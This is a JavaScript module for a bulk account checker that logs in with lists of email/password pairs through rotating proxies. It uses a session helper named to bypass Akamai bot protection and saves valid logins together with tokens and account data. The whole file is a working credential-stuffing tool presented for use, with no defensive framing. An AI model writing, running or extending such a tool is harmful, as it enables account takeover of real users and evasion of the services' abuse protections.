import Bottleneck from 'bottleneck';
import { AkamaiBypass } from './akamaiBypass.js';
import { JWTManager } from './jwtManager.js';
import { ProxyRotator } from './proxyRotator.js';
import logger from './logger.js';

export class BulkChecker {
    constructor(config = {}) {
        this.config = {
            concurrency: config.concurrency || 3,
            delayBetweenRequests: config.delayBetweenRequests || 2000,
            maxRetries: config.maxRetries || 3,
            proxyList: config.proxyList || [],
            ...config
        };

        this.limiter = new Bottleneck({
            maxConcurrent: this.config.concurrency,
            minTime: this.config.delayBetweenRequests
        });

        this.proxyRotator = new ProxyRotator(this.config.proxyList);
        this.results = [];
        this.isStopped = false;
    }

    async checkSingleAccount(account, proxy) {
        const { email, password } = account;
        for (let attempt = 1; attempt <= this.config.maxRetries; attempt++) {
            if (this.isStopped) {
                throw new Error('Process stopped by user');
            }
            try {
                const akamai = new AkamaiBypass(proxy);
                const session = await akamai.getValidSession();

                const jwtManager = new JWTManager(session.cookies);
                const loginResult = await jwtManager.login(email, password);

                if (loginResult.success) {
                    return {
                        email,
                        password,
                        status: 'VALID',
                        token: loginResult.token,
                        expires: loginResult.expires,
                        accountData: loginResult.account,
                        proxy
                    };
                } else {
                    return {
                        email,
                        password,
                        status: 'INVALID',
                        message: loginResult.message || loginResult.error,
                        proxy
                    };
                }
            } catch (error) {
                if (proxy && (error.message.includes('proxy') || error.code === 'ECONNREFUSED')) {
                    this.proxyRotator.markProxyFailed(proxy);
                }
                logger.warn(`Attempt ${attempt} failed for ${email}: ${error.message}`);

                if (attempt === this.config.maxRetries) {
                    return {
                        email,
                        password,
                        status: 'ERROR',
                        message: error.message,
                        proxy
                    };
                }
                await new Promise(r => setTimeout(r, 2000 * attempt));
            }
        }
    }

    async startFromArray(accounts) {
        this.results = [];
        this.isStopped = false;

        const tasks = accounts.map((account) => {
            return this.limiter.schedule(async () => {
                if (this.isStopped) return null;
                const proxy = this.proxyRotator.getNextProxy();
                const result = await this.checkSingleAccount(account, proxy);
                if (result) {
                    this.results.push(result);
                }
                return result;
            });
        });

        await Promise.all(tasks);
        logger.info(`Bulk check completed. Total results: ${this.results.length}`);
        return this.results;
    }

    stop() {
        this.isStopped = true;
        this.limiter.stop();
    }
}
